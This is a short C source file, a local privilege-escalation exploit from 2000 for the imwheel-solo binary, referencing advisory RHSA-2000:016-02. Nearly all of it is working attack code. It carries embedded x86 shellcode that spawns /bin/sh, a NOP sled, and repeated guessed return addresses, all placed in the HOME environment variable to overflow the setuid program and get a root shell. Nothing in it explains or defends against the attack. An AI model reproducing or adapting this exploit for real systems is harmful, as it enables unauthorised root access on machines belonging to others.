/*
 *  imwheel local root exploit [ RHSA-2000:016-02 ]
 *  funkysh 04/2000 funkysh@kris.top.pl
 */
  
#include <stdlib.h>
#include <stdio.h>

#define BUFFER 2070
#define NOP 0x90
#define PATH "/usr/X11R6/bin/imwheel-solo"  

char code[]="\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46"
            "\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e"
            "\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8"
            "\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";

unsigned long getesp(void) { __asm__("movl %esp,%eax"); }
        
int main(int argc, char *argv[])
{
  int i, offset = 0;
  char buf[BUFFER];
  long address;
  if(argc > 1) offset = atoi(argv[1]);
  address = getesp() + 1000 + offset;
  memset(buf,NOP,BUFFER);
  memcpy(buf+(BUFFER-300),code,strlen(code));

  for(i=(BUFFER-250);i<BUFFER;i+=4)
  *(int *)&buf[i]=address;
  setenv("DISPLAY", "DUPA", 1);
  setenv("HOME", buf, 1);
  execl(PATH, PATH, 0);
}           
